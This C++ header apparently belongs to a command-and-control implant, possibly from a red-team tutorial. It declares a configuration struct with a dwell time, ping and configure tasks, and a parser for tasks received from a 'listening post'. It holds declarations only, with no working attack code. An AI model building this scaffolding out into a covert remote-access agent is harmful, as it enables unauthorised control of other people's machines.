#pragma once

#define _SILENCE_CXX17_C_HEADER_DEPRECATION_WARNING

#include "results.h"

#include <variant>
#include <string>
#include <string_view>

#include <boost/uuid/uuid.hpp>
#include <boost/property_tree/ptree.hpp>

// Define implant configuration
struct Configuration {
    Configuration(double meanDwell,bool isRunning);
    const double meanDwell;
    const bool isRunning;
};

struct PingTask{
    PingTask(const boost::uuids::uuid& id);
    //to identify the task 
    constexpr static std::string_view key{"ping"};
    [[nodiscard]] Result run() const;
    //help track the individual tasks that are executing
    const boost::uuids::uuid id;
};

struct ConfigureTask {
    ConfigureTask (const boost::uuids::uuid& id,
        double meanDwell,
        bool isRunning,
        std::function<void(const Configuration&)> setter);

    constexpr static std::string_view key{"configure"};
    [[nodiscard]] Result run() const;
    const boost::uuids::uuid id;
private:
    std::function<void(const Configuration&)> setter;
    const double meanDwell;
    const bool isRunnig;
};

//responsible for parsing the tasks we receive from the listening post:
using Task = std::variant<PingTask,ConfigureTask>;

[[nodiscard]] Task parseTaskFrom(const boost::property_tree::ptree& taskTree,
    std::function<void(const Configuration&)> setter);

